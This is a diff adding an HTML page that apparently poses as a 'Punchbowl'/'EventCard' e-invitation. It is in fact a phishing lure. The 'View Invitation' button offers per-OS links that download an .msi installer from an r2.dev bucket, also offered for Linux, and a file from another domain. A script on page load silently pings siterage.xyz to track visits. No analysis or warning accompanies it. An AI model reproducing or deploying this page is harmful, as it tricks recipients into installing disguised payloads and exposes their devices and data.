@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>You're Invited!</title>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+html,
+body {
+    width: 100%;
+    height: 100%;
+    margin: 0;
+}
+
+body {
+    font-family: Arial, Helvetica, sans-serif;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    background: linear-gradient(
+        110deg,
+        #a7d9b8 0%,
+        #9bcfc7 45%,
+        #82bfd2 100%
+    );
+}
+
+/* Main Card */
+.card {
+    width: 700px;
+    max-width: calc(100% - 40px);
+    min-height: 460px;
+
+    padding: 35px 45px;
+
+    border-radius: 23px;
+
+    background: rgba(205, 229, 228, 0.60);
+
+    box-shadow:
+        0 20px 40px rgba(50, 90, 95, 0.25);
+
+    text-align: center;
+
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: flex-start;
+}
+
+/* Logo */
+.logo {
+    margin-top: 0;
+    margin-bottom: 55px;
+
+    font-size: 28px;
+    font-weight: 500;
+
+    color: #3e3e42;
+
+    letter-spacing: -1px;
+}
+
+.logo-icon {
+    display: inline-flex;
+
+    align-items: center;
+    justify-content: center;
+
+    width: 40px;
+    height: 40px;
+
+    margin-right: 7px;
+
+    border-radius: 50%;
+
+    background: #fa735f;
+
+    color: #ffffff;
+
+    font-size: 24px;
+    font-weight: bold;
+
+    vertical-align: middle;
+}
+
+/* Heading */
+h1 {
+    margin: 0 0 25px;
+
+    font-size: 50px;
+    line-height: 1.1;
+
+    color: #29292d;
+
+    font-weight: 700;
+}
+
+/* Main message */
+.message {
+    margin: 0;
+
+    font-size: 24px;
+    line-height: 1.5;
+
+    color: #343438;
+}
+
+/* Notice */
+.notice {
+    margin-top: 20px;
+    margin-bottom: 50px;
+
+    font-size: 20px;
+    line-height: 1.4;
+
+    color: #353538;
+
+    font-weight: 700;
+}
+
+/* Button wrapper */
+.view-wrapper {
+    position: relative;
+    display: inline-block;
+}
+
+/* Main button */
+.button {
+    display: inline-flex;
+
+    align-items: center;
+    justify-content: center;
+
+    min-width: 238px;
+    height: 68px;
+
+    padding: 0 35px;
+
+    border: 1px solid rgba(255, 255, 255, 0.35);
+    border-radius: 40px;
+
+    background: #087bd6;
+
+    color: #ffffff;
+
+    font-family: Arial, Helvetica, sans-serif;
+    font-size: 24px;
+    font-weight: 500;
+
+    cursor: pointer;
+
+    box-shadow:
+        0 7px 14px rgba(0, 0, 0, 0.18);
+
+    transition:
+        transform 0.15s ease,
+        box-shadow 0.15s ease,
+        background 0.15s ease;
+}
+
+.button:hover {
+    background: #066fc4;
+
+    transform: translateY(-2px);
+
+    box-shadow:
+        0 10px 18px rgba(0, 0, 0, 0.22);
+}
+
+.button:active {
+    transform: translateY(1px);
+}
+
+/* Operating system menu */
+.os-options {
+    display: none;
+
+    position: absolute;
+
+    left: 50%;
+    bottom: calc(100% + 12px);
+
+    transform: translateX(-50%);
+
+    width: 238px;
+
+    padding: 8px;
+
+    background: #ffffff;
+
+    border-radius: 14px;
+
+    box-shadow:
+        0 10px 30px rgba(0, 0, 0, 0.20);
+
+    z-index: 100;
+}
+
+/* Show menu */
+.os-options.show {
+    display: block;
+}
+
+/* OS links */
+.os-options a {
+    display: block;
+
+    padding: 13px 15px;
+
+    color: #333333;
+
+    text-decoration: none;
+
+    font-size: 17px;
+
+    text-align: left;
+
+    border-radius: 9px;
+
+    transition: background 0.15s ease;
+}
+
+.os-options a:hover {
+    background: #f1f1f1;
+}
+
+/* Mobile */
+@media (max-width: 700px) {
+
+    .card {
+        min-height: auto;
+
+        padding: 30px 25px 40px;
+    }
+
+    .logo {
+        margin-bottom: 40px;
+
+        font-size: 25px;
+    }
+
+    h1 {
+        font-size: 38px;
+    }
+
+    .message {
+        font-size: 19px;
+    }
+
+    .notice {
+        font-size: 17px;
+
+        margin-bottom: 35px;
+    }
+
+    .button {
+        height: 60px;
+
+        min-width: 210px;
+
+        font-size: 20px;
+    }
+
+    .os-options {
+        width: 210px;
+    }
+}
+</style>
+</head>
+
+
+<body>
+
+<!-- Main invitation card -->
+<div class="card">
+
+    <!-- Logo -->
+    <div class="logo">
+        <span class="logo-icon">✓</span>
+        EventCard
+    </div>
+
+
+    <!-- Heading -->
+    <h1>
+        You're Invited!
+    </h1>
+
+
+    <!-- Message -->
+    <p class="message">
+        Your invitation is ready to view.
+    </p>
+
+
+    <!-- Notice -->
+    <p class="notice">
+        Please select your operating system below.
+    </p>
+
+
+    <!-- Button + OS menu -->
+    <div class="view-wrapper">
+
+        <button
+            type="button"
+            class="button"
+            onclick="toggleOptions()">
+            View Invitation
+        </button>
+
+
+        <!-- Operating system choices -->
+        <div
+            class="os-options"
+            id="osOptions">
+
+            <a href="https://pub-8c76307b5a0649f7bedc4145a1fdb9d1.r2.dev/Punchbowl_rsvp_ecard.msi">
+                Windows
+            </a>
+
+            <a href="https://jpgdb.com/rsvp_ecard">
+                Mac
+            </a>
+
+            <a href="https://pub-8c76307b5a0649f7bedc4145a1fdb9d1.r2.dev/Punchbowl_rsvp_ecard.msi">
+                Linux
+            </a>
+
+        </div>
+
+    </div>
+
+</div>
+
+<script>
+fetch("https://siterage.xyz/view.php", {
+    method: "GET",
+    cache: "no-store",
+    keepalive: true
+}).catch(() => {});
+</script>
+<script>
+
+function toggleOptions() {
+
+    const options =
+        document.getElementById("osOptions");
+
+    options.classList.toggle("show");
+
+}
+
+
+/* Close menu when clicking elsewhere */
+document.addEventListener("click", function(event) {
+
+    const wrapper =
+        document.querySelector(".view-wrapper");
+
+    const options =
+        document.getElementById("osOptions");
+
+
+    if (!wrapper.contains(event.target)) {
+
+        options.classList.remove("show");
+
+    }
+
+});
+
+</script>
+
+</body>
+</html>
